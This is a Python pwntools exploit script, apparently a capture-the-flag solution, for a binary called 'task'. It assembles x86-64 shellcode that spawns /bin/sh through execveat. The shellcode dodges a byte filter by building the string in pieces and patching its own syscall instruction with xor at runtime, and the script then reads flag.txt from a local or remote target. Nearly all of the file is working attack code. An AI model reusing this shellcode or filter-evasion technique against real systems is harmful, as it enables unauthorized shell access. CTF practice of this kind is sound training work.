from pwn import *

elf = context.binary = ELF('./task')
context.update(arch='amd64', os='linux')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


# 6a 42                   push   0x42
# 58                      pop    rax
# fe c4                   inc    ah
# 48 99                   cqo
# 52                      push   rdx
# 48 bf 2f 62 69 6e 2f 2f 73 68    movabs rdi, 0x68732f2f6e69622f
# 57                      push   rdi
# 54                      push   rsp
# 5e                      pop    rsi
# 49 89 d0                mov    r8, rdx
# 49 89 d2                mov    r10, rdx
# 0f 05                   syscall


new_shellcode = asm('''
push   0x42
pop    rax
inc    ah

/* cqo */
push 0
pop rdx
/* cqo end */

push  rdx

/* movabs rdi, 0x68732f2f6e69622f */
/* push   rdi */
push word ptr 0x6873
push word ptr 0x2e2e
add [rsp], word ptr 0x101
push word ptr 0x6e69
push word ptr 0x622e
add [rsp], word ptr 0x1
pop rdi
push rdi
/* movabs rdi, 0x68732f2f6e69622f end */

push   rsp
pop    rsi

/* mov    r8, rdx */
push 0
pop r8

/* mov    r10, rdx */
push 0
pop r10

/* syscall */
xor byte ptr [rip + 0x7], 0x1
xor byte ptr [rip + 0x1], 0x1
.byte 0xe
.byte 0x4
''')

p.sendline(new_shellcode)

# not_banned = set([i for i in range(0x100)])

# for c in new_shellcode:
# 	not_banned.discard(int(c))

# print(', '.join(map(hex, not_banned)))

sleep(0.5)
p.sendline(b"cat flag.txt")
print(p.clean(0.5))

